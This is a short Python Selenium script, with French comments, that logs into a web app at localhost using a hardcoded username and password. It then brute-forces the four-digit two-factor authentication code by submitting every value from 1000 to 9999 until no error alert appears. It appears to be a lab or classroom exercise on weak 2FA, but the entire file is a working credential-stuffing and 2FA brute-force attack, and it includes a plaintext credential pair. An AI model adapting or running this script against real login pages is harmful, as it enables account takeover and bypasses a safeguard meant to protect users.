from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import threading

# Identifiants connus
login = 'p.ayot'
mdp = 'xiej3uuY0'

def atk(r1, r2):
    driver = webdriver.Chrome()
    driver.get("http://localhost:8000/index.php")

    try:
        driver.find_element(By.CSS_SELECTOR, 'input[name="login"]').clear()
        driver.find_element(By.CSS_SELECTOR, 'input[name="login"]').send_keys(login)
        driver.find_element(By.CSS_SELECTOR, 'input[name="mdp"]').clear()
        driver.find_element(By.CSS_SELECTOR, 'input[name="mdp"]').send_keys(mdp)
        driver.find_element(By.TAG_NAME, 'form').submit()
    except:
        print("Erreur, la page de connexion est incorrecte...")

    for code in range(r1, r2):
        # On teste le code
        time.sleep(0.5)
        try:
            driver.find_element(By.CSS_SELECTOR, 'input[name="code"]').send_keys(code)
            driver.find_element(By.TAG_NAME, 'form').submit()
            try:
                driver.find_element(By.CLASS_NAME, 'alert-danger')
            except:
                print("Code A2F trouvé : ", code)
                break
        except:
            print("Erreur, la page de saisie du code A2F est incorrecte...")
            break;

    input("");
    driver.quit();

atk(1000, 9999)